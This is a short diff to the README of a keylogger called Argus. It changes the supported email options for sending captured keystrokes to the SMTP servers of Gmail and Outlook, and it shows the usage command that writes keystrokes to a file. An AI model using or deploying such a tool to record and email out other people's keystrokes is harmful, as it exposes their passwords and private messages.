@@ -11,7 +11,7 @@ Initializing Argus to write the keystrokes into a file.
 argus file
 ```
 
-Initializing Argus to send the keystrokes through email. Implemented email domains are *gmail.com* and *outlook.com*.
+Initializing Argus to send the keystrokes through email. Implemented email smtp servers are *smtp.gmail.com* and *smtp-mail.outlook.com*.
 
 (*Environment variables are the most critical here, you should have set the environment variables `EMAIL` and `PASSWORD`*)
 
